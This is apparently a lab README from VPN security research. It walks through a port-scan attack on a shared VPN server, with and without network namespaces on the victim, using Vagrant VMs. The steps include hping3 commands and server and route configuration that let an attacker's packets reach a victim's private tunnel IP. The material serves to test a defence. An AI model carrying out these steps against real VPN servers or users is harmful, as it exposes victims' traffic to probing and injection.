# Overview
This document outlines the process for performing the port scan attack with and without network namespaces.
## Environment Setup

1. Start the VMs

```bash
$ ./boot_all.sh
```

2. SSH to the Attacker, Attacker2, victim and VPN server on 4 terminals 

```bash
$ vagrant ssh attacker
$ vagrant ssh attacker2
$ vagrant ssh victim
$ vagrant ssh vpnserver
```
## VPN Server setup
On the VPN server, setup client specific configuration. This allows for the same private IP to be allocated to both attacker and client.
```bash
$ sudo bash -c 'sudo echo "client-config-dir ccd" >> /etc/openvpn/server.conf'
$ sudo mkdir /etc/openvpn/ccd
$ sudo bash -c 'sudo echo "ifconfig-push 10.8.0.6 255.255.255.0" > /etc/openvpn/ccd/ChangeMe'
$ sudo systemctl restart openvpn@server
```

## Port Scan Without Namespaces
### Attacker
1. Connect to the VPN server

```bash
$ cd /vagrant/
$ sudo openvpn client2.ovpn
```

2. Make sure the attacker traffic to second attacker machine gets sent through the VPN tunnel.
```bash
$ sudo ip route add 192.168.254.3/24 dev tun0
```

3. Send packets to the second attacker controlled machine
```bash
$ sudo hping3 -2  -s 56666 -k -p 56666 192.168.254.3
```

4. Disconnect the attacker from the VPN server.

```bash
$ sudo killall openvpn
```

### Victim
5. Connect to the VPN and listen on the tunnel.
```bash
$ sudo openvpn --config /vagrant/client1.ovpn 
$ sudo tcpdump -i tun0
```
### Attacker2
6. Start sending packets to the VPN.
```bash
$ sudo hping3 -2  -s 56666 -k -p 56666 192.168.2.254
```
Within a minute, you should be able to see traffic from the Attacker2 machine sent to the victim's private IP.

## Port Scan With Namespaces
### Attacker
1. Connect to the VPN server

```bash
$ cd /vagrant/
$ sudo openvpn client2.ovpn
```

2. Make sure the attacker traffic to second attacker machine gets sent through the VPN tunnel.
```bash
$ sudo ip route add 192.168.254.3/24 dev tun0
```

3. Send packets to the second attacker controlled machine
```bash
$ sudo hping3 -2  -s 56666 -k -p 56666 192.168.254.3
```

4. Disconnect the attacker from the VPN server.

```bash
$ sudo killall openvpn
```

### Victim
5. Connect to the VPN and listen on the tunnel.
```bash
$ sudo /vagrant/namespaced-openvpn --config /vagrant/client1.ovpn
$ sudo ip netns exec protected sudo -u $USER -i 
$ sudo tcpdump -i tun0
```
### Attacker2
6. Start sending packets to the VPN.
```bash
$ sudo hping3 -2  -s 56666 -k -p 56666 192.168.2.254
```
Within a minute, you should be able to see traffic from the Attacker2 machine sent to the victim's private IP. This might take a bit longer than without the namespaces.